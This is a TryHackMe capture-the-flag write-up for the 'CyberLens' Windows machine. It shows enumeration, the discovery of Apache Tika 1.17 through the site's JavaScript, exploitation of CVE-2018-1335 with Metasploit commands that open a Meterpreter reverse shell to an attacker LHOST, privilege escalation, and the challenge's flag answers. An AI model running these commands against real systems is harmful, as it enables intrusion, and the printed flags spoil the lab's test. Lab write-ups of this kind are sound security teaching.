# CyberLens — TryHackMe Writeup
> **Platform:** TryHackMe | **Category:** Windows, Apache Tika RCE, Privilege Escalation

---

## Overview

This machine hosts a Windows-based steganography-themed website featuring a "metadata extractor" tool. Reviewing the frontend JavaScript reveals that this feature actually forwards uploaded files to a locally-bound **Apache Tika 1.17** server, which is vulnerable to a known command injection vulnerability (CVE-2018-1335). A public Metasploit module exploits this directly into a Meterpreter session as the `CyberLens` user. From there, Metasploit's built-in exploit suggester identifies a local privilege escalation path to Administrator.

**Attack Chain:**
```
Nmap → Web enumeration → JS source review → Apache Tika 1.17 identified
→ CVE-2018-1335 (Header Command Injection) → Metasploit exploit
→ Meterpreter session as CyberLens → User flag
→ exploit_suggester → Privilege escalation → Administrator → Root flag
```

---

## Step 1 — Reconnaissance

```bash
sudo nmap -sV -O 10.67.189.47
```

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 (Win64)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Service Info: OS: Windows
```

A Windows host with the usual SMB/RDP/WinRM footprint, plus a web server on port 80.

---

## Step 2 — Web Enumeration

Browsing to port 80 shows a fairly ordinary-looking website with a steganography theme, a contact form, and a "metadata extractor" feature. Before poking at parameters directly, the site structure is mapped out first with Gobuster:

```bash
gobuster dir -u http://10.67.189.47 -w common.txt
```

```
Images  (Status: 301) [--> http://10.67.189.47/Images/]
css     (Status: 301) [--> http://10.67.189.47/css/]
images  (Status: 301) [--> http://10.67.189.47/images/]
js      (Status: 301) [--> http://10.67.189.47/js/]
```

The `/images/` directories hold the site's images — potentially worth checking for embedded metadata later, since the challenge itself is metadata-themed. For now, the `/js/` directory is more interesting, since it contains the client-side logic behind the metadata extractor feature.

---

## Step 3 — Reviewing Client-Side Logic

The JavaScript powering the "metadata extractor" button is retrieved from `/js/`:

```javascript
document.getElementById("metadataButton").addEventListener("click", function() {
  var fileInput = document.getElementById("imageFileInput");
  var file = fileInput.files[0];

  var reader = new FileReader();
  reader.onload = function() {
    var fileData = reader.result;

    fetch("http://localhost:61777/meta", {
      method: "PUT",
      body: fileData,
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/octet-stream"
      }
    })
    ...
  };
  reader.readAsArrayBuffer(file);
});
```

This reveals that the "metadata extractor" isn't a custom feature at all — it forwards the uploaded file straight to a local service listening on **port 61777**.

---

## Step 4 — Identifying Apache Tika

Browsing directly to the internal service:

```
http://10.67.189.47:61777/
```

```
Welcome to the Apache Tika 1.17 Server
```

A quick search for known vulnerabilities in this version surfaces:

> **CVE-2018-1335** — Apache Tika Header Command Injection

This looks like the intended path. Time to dig into exploitation.

---

## Step 5 — Exploitation via Metasploit

Searching Metasploit for a matching module:

```
msf > search tika
```

```
#  Name                                            Rank       Description
0  exploit/windows/http/apache_tika_jp2_jscript    excellent  Apache Tika Header Command Injection
```

Checking the module's supported version range before running it:

```
msf exploit(windows/http/apache_tika_jp2_jscript) > info
```

```
Description:
  This module exploits a command injection vulnerability in Apache
  Tika 1.15 - 1.17 on Windows.
```

Version 1.17 falls within the supported range. Configuring and running the exploit:

```
set RHOSTS 10.67.189.47
set RPORT 61777
set LHOST 192.168.138.111
exploit
```

```
[+] The target is vulnerable. Target is vulnerable based on version: 1.17
[*] Sending PUT request to 10.67.189.47:61777/meta
[*] Command Stager progress - 100.00% done (9701/9701 bytes)
[*] Sending stage (199238 bytes) to 10.67.189.47
[*] Meterpreter session 1 opened (192.168.138.111:4444 -> 10.67.189.47:49997)
```

A Meterpreter session is established. Dropping into a native Windows shell:

```
C:\Users\CyberLens>dir
```

```
 Directory of C:\Users\CyberLens
 06/06/2023  07:53 PM    <DIR>          Desktop
 ...
```

---

## Step 6 — User Flag

```
C:\Users\CyberLens>cd Desktop
C:\Users\CyberLens\Desktop>dir
```

```
 06/06/2023  07:54 PM                25 user.txt
```

```
C:\Users\CyberLens\Desktop>type user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
```

**User flag captured.**

---

## Step 7 — Privilege Escalation to Administrator

The Meterpreter session is backgrounded, and Metasploit's built-in **exploit suggester** module is run against it to identify a suitable local privilege escalation path. It surfaces a working exploit, which is used to elevate the session from `CyberLens` to `Administrator`.

With administrative access confirmed, the root flag is retrieved:

```
C:\Users\Administrator\Desktop>type admin.txt
THM{3lev@t3D-4-pr1v35c!}
```

**Root flag captured.**

---

## Summary of Findings

| Step | Vulnerability | Impact |
|------|---------------|--------|
| Reconnaissance | Client-side JS exposed the internal service and port behind a "metadata extractor" feature | Discovery of Apache Tika 1.17 |
| Initial Access | CVE-2018-1335 — Apache Tika Header Command Injection | Remote code execution, Meterpreter session as `CyberLens` |
| Privilege Escalation | Local Windows privilege escalation flaw identified via Metasploit's exploit suggester | Full Administrator access |

---

## Key Takeaways

- **Always review client-side JavaScript** — it frequently reveals internal endpoints, hidden ports, and backend technologies that aren't visible from the page itself.
- **Internal/localhost-bound services are not inherently safe** — if a frontend feature can reach them via a proxied request, so can an attacker who understands the flow.
- **Outdated third-party components (like Apache Tika) carry the same risk as outdated CMS plugins** — version fingerprinting and a quick CVE lookup is often all it takes to find a public exploit.
- **Metasploit's `post/multi/recon/local_exploit_suggester` is a fast way to triage privilege escalation options** once an initial foothold is established, especially on Windows targets with many possible local exploits.


